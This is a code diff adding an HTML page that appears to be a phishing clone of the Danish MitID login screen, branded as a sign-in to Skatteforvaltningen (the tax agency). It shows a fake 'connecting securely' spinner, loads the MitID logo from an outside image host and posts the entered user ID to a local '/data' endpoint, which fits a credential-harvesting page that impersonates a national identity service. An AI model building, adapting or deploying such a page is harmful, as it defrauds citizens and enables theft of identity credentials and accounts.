@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>MitID</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"
+      integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="/static/style.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css"
+    />
+  </head>
+
+  <body>
+    <script
+      src="https://code.jquery.com/jquery-3.6.1.min.js"
+      integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ="
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js"
+      integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js"
+      integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
+      crossorigin="anonymous"
+    ></script>
+    <script>
+      $(function () {
+        $('#spinner').fadeIn(200);
+        setTimeout(() => {
+          $('#spinner').hide();
+          $('#main-wrapper').show();
+        }, 2500)
+        $('.btn-submit').attr('disabled', true);
+        $('#bruger-id').keyup(function(event) {
+          if (event.target.value.length != 0) {
+            $('.btn-submit').attr('disabled', false);
+          }
+          else {
+            $('.btn-submit').attr('disabled', true);
+          }
+        })
+      });
+    </script>
+
+    <nav class="navbar navbar-light justify-content-between">
+      <a class="navbar-brand">
+        <div class="menu"></div>
+        <div class="menu"></div>
+        <div class="menu"></div>
+      </a>
+      <div class="form-inline">
+        <a href="javascript:" class="btn-eng">English</a>
+      </div>
+    </nav>
+
+    <div class="blue">
+      <h3 class="nav-title">MitID</h3>
+    </div>
+
+    <div id="spinner" class="loading-wrapper">
+      <div class="w-100 h-100 d-flex flex-column justify-content-center align-items-center position-relative">
+        <img src="https://i.postimg.cc/qB1wXdsv/mitid.png" width="70" class="mitid-loader-logo" />
+        <div class="mitid-loader__state">
+          <svg xmlns="http://www.w3.org/2000/svg" focusable="false" class="mitid-loader__shield" aria-hidden="true">
+            <path d="M49.9 0l50 15v41.2c0 47.8-50 60.8-50 60.8s-50-13-50-60.8V15l50-15"></path>
+          </svg>
+          <svg viewBox="30 30 60 60" focusable="false" aria-hidden="true" class="mitid-loader__circular">
+            <circle cx="60" cy="60" r="27" fill="none" stroke="#3380eb" stroke-linecap="square" stroke-miterlimit="10" stroke-width="5"></circle><circle cx="60" cy="60" r="27" fill="none" stroke="#fff" stroke-dasharray="50 200" stroke-linecap="square" stroke-miterlimit="10" stroke-width="5"></circle>
+          </svg>
+        </div>
+        <div class="mitid-loader__text">
+          <h3 class="mitid-loader__title">
+            Forbinder sikkert til MitID
+          </h3>
+          <span class="mitid-loader__description">
+            Vent et øjeblik...
+          </span>
+        </div>
+      </div>
+    </div>
+
+    <div id="main-wrapper" style="display: none;">
+      <div class="form">
+        <div class="container-fluid h-100 d-flex flex-column">
+          <div class="login">
+            <h3 class="login-title">Log på hos Skatteforvaltningen</h3>
+            <img src="https://i.postimg.cc/qB1wXdsv/mitid.png" />
+          </div>
+          <form action="/data" method="POST" class="form-login" id="login-form">
+            <div class="form-group input-group-lg">
+              <label for="bruger-id" class="bruger-id">BRUGER-ID</label>
+              <img src="/static/help.svg" class="icon-help ml-3"></img>
+              <input
+                type="text"
+                class="form-control bruger-input"
+                id="bruger-id"
+                name="userId"
+                required
+              />
+            </div>
+            <button
+              type="submit"
+              class="btn btn-blue btn-lg btn-block btn-submit"
+            >
+              Fortsæt <i class="fa-lg fa-solid fa-arrow-right"></i>
+            </button>
+            <span class="id-check">
+              <img src="/static/info.svg" class="icon-info"></img> Glemt
+              bruger-ID?
+            </span>
+          </form>
+  
+          <div
+            class="form-check input-group-lg d-flex flex-row align-items-center"
+            style="margin-top: 45%;"
+          >
+            <label class="mitid-checkbox mitid-checkbox_user-id" for="mitid-remember-me">
+              <span class="mitid-checkbox__label">Husk mig hos Skatteforvaltningen</span>
+              <input id="mitid-remember-me" class="mitid-checkbox__input" name="remember" type="checkbox" autocomplete="on" />
+              <span class="mitid-checkbox__checkmark">
+                <span class="mitid-checkbox__checker" />
+              </span>
+          </label>
+          </div>
+        </div>
+      </div>
+  
+      <footer class="mitid-footer">
+        <hr class="mitid-divider">
+        <div class="mitid-footer__nav">
+          <a type="button" href="#" class="mitid-core-text-button " id="mitidCancelButtonId" role="button">
+            <div class="mitid-core-text-button__text">
+              <span class="mitid-core-text-button__label">
+                Afbryd
+              </span>
+            </div>
+          </a>
+          <a type="button" href="#" class="mitid-core-text-button mitid--button--left " id="mitidHelpButtonId" role="button" aria-haspopup="true" aria-expanded="false">
+            <div class="mitid-core-text-button__text">
+              <span class="mitid-core-text-button__label">
+                Hjælp
+              </span>
+            </div>
+          </a>
+        </div>
+      </footer>
+    </div>
+  </body>
+</html>
